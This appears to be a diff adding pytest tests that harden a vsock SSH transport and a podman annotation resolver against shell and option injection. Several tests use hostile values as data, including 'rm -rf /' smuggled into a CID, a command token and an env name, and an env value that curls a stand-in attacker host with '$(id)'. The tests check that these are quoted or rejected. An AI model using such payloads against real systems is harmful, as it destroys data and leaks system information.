@@ -54,6 +54,33 @@ class TestVsockEndpoint:
         with pytest.raises(AttributeError):
             ep.cid = 4  # type: ignore[misc]
 
+    def test_coerces_int_convertible_string(self) -> None:
+        """``cid="3"`` is a valid input — defensive coercion."""
+        ep = VsockEndpoint(cid="3", port="22")  # type: ignore[arg-type]
+        assert ep.cid == 3
+        assert ep.port == 22
+
+    @pytest.mark.parametrize("cid", [0, 1, 2])
+    def test_rejects_reserved_cids(self, cid: int) -> None:
+        """CIDs 0 (ANY), 1 (HYPERVISOR), 2 (HOST) are spec-reserved."""
+        with pytest.raises(ValueError, match="reserved by the vsock spec"):
+            VsockEndpoint(cid=cid)
+
+    def test_rejects_out_of_range_cid(self) -> None:
+        """CID > u32 max is structurally invalid."""
+        with pytest.raises(ValueError, match="outside u32 range"):
+            VsockEndpoint(cid=2**32)
+
+    def test_rejects_non_int_convertible(self) -> None:
+        """Strings carrying shell metachars would otherwise hit ProxyCommand."""
+        with pytest.raises(ValueError, match="int-convertible"):
+            VsockEndpoint(cid="3; rm -rf /")  # type: ignore[arg-type]
+
+    def test_rejects_port_zero(self) -> None:
+        """Port 0 is invalid — the SAFE_RUNTIMES-style range check."""
+        with pytest.raises(ValueError, match="port 0"):
+            VsockEndpoint(cid=3, port=0)
+
 
 class TestVsockSSHTransportArgv:
     """Argv assembly is the only side-effect-free thing in the transport."""
@@ -77,6 +104,17 @@ class TestVsockSSHTransportArgv:
         assert "StrictHostKeyChecking=no" in opts
         assert "UserKnownHostsFile=/dev/null" in opts
 
+    def test_argv_uses_identities_only(self) -> None:
+        """``IdentitiesOnly=yes`` keeps a stray ssh-agent from being consulted.
+
+        Without it, a host-level ssh-agent carrying unrelated identities
+        could offer them to the guest sshd; only the explicit ``-i``
+        identity should be used.
+        """
+        argv = _make_transport()._ssh_argv(VsockEndpoint(cid=3))
+        opts = [argv[i + 1] for i, t in enumerate(argv) if t == "-o"]
+        assert "IdentitiesOnly=yes" in opts
+
     def test_argv_carries_identity_file(self) -> None:
         """``-i <key_path>`` carries the host-side private key."""
         argv = _make_transport()._ssh_argv(VsockEndpoint(cid=3))
@@ -99,10 +137,12 @@ class TestVsockSSHTransportExec:
             )
             result = _make_transport(cid=3).exec(_StubContainer("ctr"), ["echo", "hi"])
         argv = run.call_args[0][0]
-        # `--` separates ssh flags from the remote command.
+        # `--` separates ssh flags from the (single) remote command string.
+        # Argv semantics are preserved across sshd's shell-parsing by
+        # shlex-quoting each token into one string.
         assert "--" in argv
         sep = argv.index("--")
-        assert argv[sep + 1 :] == ["echo", "hi"]
+        assert argv[sep + 1 :] == ["echo hi"]
         assert result == ExecResult(exit_code=0, stdout="hi\n", stderr="")
 
     def test_exec_propagates_nonzero_exit_and_stderr(self) -> None:
@@ -162,14 +202,16 @@ class TestVsockSSHTransportExecStdio:
             )
         argv = popen.call_args[0][0]
         sep = argv.index("--")
-        # The env prefix lands at the start of the remote command.
-        assert argv[sep + 1] == "env"
-        assert "FOO=1" in argv[sep + 2 : sep + 4]
-        assert "BAR=x" in argv[sep + 2 : sep + 4]
-        assert argv[-1] == "sh"
+        # The whole remote command is a single shlex-quoted string at
+        # argv[-1]; env tokens come first, then the cmd.
+        remote = argv[sep + 1]
+        assert remote.startswith("env ")
+        assert "FOO=1" in remote
+        assert "BAR=x" in remote
+        assert remote.endswith(" sh")
 
     def test_no_env_skips_prefix(self) -> None:
-        """Without env, the remote command is the bare argv."""
+        """Without env, the remote command is just the (quoted) argv."""
         with patch("subprocess.Popen") as popen:
             proc = MagicMock()
             proc.stdin = io.BytesIO()
@@ -187,6 +229,68 @@ class TestVsockSSHTransportExecStdio:
         sep = argv.index("--")
         assert argv[sep + 1 :] == ["sh"]
         assert rc == 7
+
+    def test_shell_metacharacters_in_cmd_are_quoted(self) -> None:
+        """``cmd=["echo", "; rm -rf /"]`` does NOT inject a remote rm.
+
+        sshd concatenates the post-``--`` tokens and hands them to the
+        in-guest user's shell; the transport must quote each token so
+        the API's argv contract holds across the shell boundary.
+        """
+        with patch("subprocess.run") as run:
+            run.return_value = subprocess.CompletedProcess(
+                args=[], returncode=0, stdout="", stderr=""
+            )
+            _make_transport().exec(
+                _StubContainer("ctr"),
+                ["echo", "; rm -rf /"],
+            )
+        remote = run.call_args[0][0][-1]
+        # The injected metachar block survives only as a quoted literal —
+        # the remote shell will see ``echo '; rm -rf /'`` and treat the
+        # second token as the literal echoed string.
+        assert "'; rm -rf /'" in remote
+        # Sanity: no unquoted ``;`` anywhere in the remote command.
+        assert "; rm -rf /;" not in remote and "echo ; " not in remote
+
+    def test_shell_metacharacters_in_env_value_are_quoted(self) -> None:
+        """A hostile env value can't escape the ``env K=V`` shape either."""
+        with patch("subprocess.Popen") as popen:
+            proc = MagicMock()
+            proc.stdin = io.BytesIO()
+            proc.stdout = io.BytesIO()
+            proc.stderr = None
+            proc.wait.return_value = 0
+            popen.return_value = proc
+            _make_transport().exec_stdio(
+                _StubContainer("ctr"),
+                ["sh"],
+                stdin=io.BytesIO(),
+                stdout=io.BytesIO(),
+                env={"X": "1; curl http://attacker/$(id)"},
+            )
+        remote = popen.call_args[0][0][-1]
+        # The hostile value lives inside a single-quoted shell literal;
+        # the remote ``env`` command will see X with that exact string.
+        assert "'X=1; curl http://attacker/$(id)'" in remote
+
+    def test_env_var_name_must_be_valid_identifier(self) -> None:
+        """Names like ``"X; rm -rf /"`` are rejected up front."""
+        with patch("subprocess.Popen"):
+            with pytest.raises(ValueError, match="must match"):
+                _make_transport().exec_stdio(
+                    _StubContainer("ctr"),
+                    ["sh"],
+                    stdin=io.BytesIO(),
+                    stdout=io.BytesIO(),
+                    env={"X; rm -rf /": "1"},
+                )
+
+    def test_empty_cmd_rejected(self) -> None:
+        """Empty argv is a contract violation, not "no remote command"."""
+        with patch("subprocess.run"):
+            with pytest.raises(ValueError, match="must not be empty"):
+                _make_transport().exec(_StubContainer("ctr"), [])
 
     def test_timeout_escalates_terminate_then_kill(self) -> None:
         """If the child also ignores terminate, the cleanup escalates to kill.
@@ -269,7 +373,38 @@ class TestPodmanAnnotationResolver:
     def test_default_annotation_constant_is_used(self) -> None:
         """`DEFAULT_CID_ANNOTATION` is the agreed key between orchestrator and resolver."""
         resolver = podman_annotation_resolver()
-        with patch("subprocess.check_output", return_value="1\n") as ck:
+        # Use a non-reserved CID (3) so the VsockEndpoint construction
+        # succeeds; we only care that the resolver passed the right
+        # annotation key to ``podman inspect``.
+        with patch("subprocess.check_output", return_value="3\n") as ck:
             resolver(_StubContainer("ctr"))
         fmt = ck.call_args[0][0][ck.call_args[0][0].index("--format") + 1]
         assert DEFAULT_CID_ANNOTATION in fmt
+
+    def test_inspect_argv_uses_end_of_options_separator(self) -> None:
+        """``--`` before the container name blocks option-name injection.
+
+        A handle with a leading-dash name (``"-format=..."``) would
+        otherwise be reparsed by podman as a flag.  The end-of-options
+        ``--`` makes everything after it positional.
+        """
+        resolver = podman_annotation_resolver()
+        with patch("subprocess.check_output", return_value="3\n") as ck:
+            resolver(_StubContainer("hostile-name"))
+        argv = ck.call_args[0][0]
+        assert "--" in argv
+        assert argv[argv.index("--") + 1 :] == ["hostile-name"]
+
+    def test_rejects_reserved_cid_from_annotation(self) -> None:
+        """A misconfigured allocator handing back CID 2 is refused at the boundary."""
+        resolver = podman_annotation_resolver()
+        with patch("subprocess.check_output", return_value="2\n"):
+            with pytest.raises(RuntimeError, match="invalid .* annotation"):
+                resolver(_StubContainer("ctr"))
+
+    def test_rejects_out_of_range_cid_from_annotation(self) -> None:
+        """A CID outside u32 range is refused before reaching ProxyCommand."""
+        resolver = podman_annotation_resolver()
+        with patch("subprocess.check_output", return_value="99999999999\n"):
+            with pytest.raises(RuntimeError, match="invalid .* annotation"):
+                resolver(_StubContainer("ctr"))
